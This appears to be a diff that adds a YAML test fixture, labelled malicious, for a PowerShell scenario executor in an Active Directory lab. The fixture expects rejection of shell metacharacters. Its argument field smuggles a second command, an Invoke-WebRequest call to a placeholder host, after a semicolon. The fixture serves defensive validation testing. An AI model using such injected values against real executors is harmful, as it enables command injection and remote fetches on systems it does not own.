@@ -1,0 +1,10 @@
+# expect-error: shell metacharacter or newline is not allowed
+# MALICIOUS FIXTURE: command injection attempt through an executor argument.
+schema_version: "1.0"
+id: SCN-AD-903
+executor:
+  type: powershell
+  script: scenarios/scripts/ad/Request-LabServiceTicket.ps1
+  arguments: ["-ServiceAccount", "svc_lab; Invoke-WebRequest https://example.invalid/x"]
+  timeout: PT1M
+  elevation_required: false
